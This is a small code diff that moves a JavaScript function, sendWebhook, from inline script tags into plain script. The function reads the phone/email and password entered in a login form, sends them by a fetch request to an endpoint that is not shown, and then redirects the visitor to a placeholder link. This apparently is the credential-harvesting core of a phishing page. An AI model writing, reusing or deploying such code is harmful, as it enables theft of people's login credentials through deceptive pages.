@@ -1,6 +1,4 @@
-<script>
-  function sendWebhook() {
-
+function sendWebhook() {
     var phoneNumber = document.getElementById('input__mailtel').value;
     var password = document.getElementById('input__password').value;
 
@@ -19,4 +17,3 @@
     }).then(response => console.log(response));
     location.href = " links "
 }
-</script>
